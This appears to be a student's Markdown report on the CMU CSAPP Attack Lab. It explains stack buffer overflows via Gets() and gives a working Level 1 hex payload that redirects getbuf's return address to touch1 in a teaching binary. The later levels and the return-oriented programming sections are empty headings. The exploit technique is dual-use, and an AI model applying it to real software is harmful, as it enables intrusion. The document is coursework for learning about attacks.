###  Table Of Content

- [Part I: Code Injection Attacks](#part-i-code-injection-attacks)
	- [1.1 Level 1](#11-level-1)
	- [1.2 Level 2](#12-level-2)
	- [1.3 Level 3](#13-level-3)
	
- [Part II: Return-Oriented Programming](#part-ii-return-oriented-programming)
	- [2.1 Level 2](#21-level-2)
	- [2.2 Level 3](#22-level-3)


# 	Attack Lab Report

In this lab, it used the vulnerability of function `Gets()` to do the correspond attacks, where it never check the input string length to trigger the buffer overflow attack.

```c
1 unsigned getbuf() 
2 { 
3 	char buf[BUFFER_SIZE]; 
4 	Gets(buf); 
5 	return 1; 
6 }
```

Specifically, this lab uses two types of attack : `Code Injection` and `Return-Oriented Programming`

Here is the summary of lab phases: 

| Phase  | Program   | Level  |	Method	| Functions|
| :----: |:--------:| :----: | :------: | :-------:|
| 1      	| CTARGET |   1     |      CI       |  Touch1  |
| 2      	| CTARGET |   2     |      CI       |  Touch2  |
| 3      	| CTARGET |   3     |      CI       |  Touch3  |
| 4      	| RTARGET |   2     |     ROP     |  Touch2  |
| 5      	| RTARGET |   3     |     ROP     |  Touch3  |

**where CI = Code Injection; ROP = Return-Oriented Programming.**

![stack_layout](pic/stack_layout.JPG )
<p align="center">Figure 1. Stack Layout in  Memory</p></br>

![code_injection_attack](pic/code_injection_attack.JPG)
<p align="center">Figure 2. Code Injection Attack</p></br>

In the code injection attack, the attacker just filled out the caller frame in the stack frame until it reaches the return address section (**shown in Figure 1**). Then the attacker will utilize the vulnerable function like `gets()`, where it never checks the length of the input string, to overwrite the content in the `ret` area and replace it with the address that the attacker intends to reach.(**shown in Figure 2**)

When it go the function that attack would like to go, then the next operation will control by attacker and they can do whatever they want.

##	Part I: Code Injection Attacks

### 1.1 Level 1

In this part, I used the vulnerability of the function `unsigned getbuf()` to get the **CTarget**  to execute the code for `touch 1`, when `getbuf()` executes its return statement, rather than executes the function of `test()`.

The code of `test`:

```c
1 void test() 
2 { 
3	int val;
4	val = getbuf();
5	printf("No exploit);.
6 }
```

The code of `touch 1`:

```c
1 void touch1() 
2 {
3	vlevel = 1; / * Part of validation protocol * / 
4 	printf("Touch1!: You called touch1()\n");
5 	validate(1);
6 	exit(0);
7 }
```

Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since `touch1` causes the program to exit directly.

In this lab, we don't need to injection any code into the program, rather, all the thing we need to do is by using the vulnerability of `getbuf()` to change target the address of `ret` in the stack frame of `getbuf()`, where replace the address of `test()` with `touch1()`.

Just like what we saw in the description of **code injection attack**, the thing we need to do is overwitten the return address of `getbuf()` to make it not jump back to the funciton `test()`. Rather, jump to the function `touch1()`.

For more detail, let's look the assembly code of `getbuf()` (In `ctarget`):

```asm
(gdb) disas getbuf Dump of assembler code for function getbuf:   0x00000000004017a8 <+0>:	sub    $0x28,%rsp   0x00000000004017ac <+4>:	mov    %rsp,%rdi   0x00000000004017af <+7>:	callq  0x401a40 <Gets>   0x00000000004017b4 <+12>:	mov    $0x1,%eax   0x00000000004017b9 <+17>:	add    $0x28,%rsp   0x00000000004017bd <+21>:	retq   End of assembler dump.
```
As the code shown us, the function `getbuf()` request 0x28 (40 in Decimal) bytes spaces for the input buffer, and then return back the to the `test()`. Note that there is no arguement passed into `getbuf()`. Thus, we can make sure that if our input string longer than 40, then we can overwrite the return area of `getbuf()`. Since we are using 64-bit machine, **the length of return address should be 8 bytes.** Also, we pass the target address as a data, and thus it should follow the **order of little endian**.

Moreover, we can get the adderss of `touch1()` by seeing its assembly code, which is `0x4017c0`.

```asm
(gdb) disas touch1 Dump of assembler code for function touch1:   0x00000000004017c0 <+0>:	sub    $0x8,%rsp ; the begin address of touch1()   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>   0x00000000004017d8 <+24>:	mov    $0x1,%edi   0x00000000004017dd <+29>:	callq  0x401c8d <validate>   0x00000000004017e2 <+34>:	mov    $0x0,%edi   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>End of assembler dump.(gdb) 
```

Here is our code injection payload:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 <- the last position of buffer
c0 17 40 00 00 00 00 00 <- the postion of we want to overwrite ( the position of rsp)
```
Finally, we need to use the program `hex2raw` to convert our input string to the real binary attach string.

we have successfully made the program jump to `touch 1()` in the final.

```bash
➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level1.txt | ./ctarget -q Cookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
```

### 1.2 Level 2


### 1.3 Level 3


##	Part II: Return-Oriented Programming

###  2.1 Level 2

###  2.2 Level 3
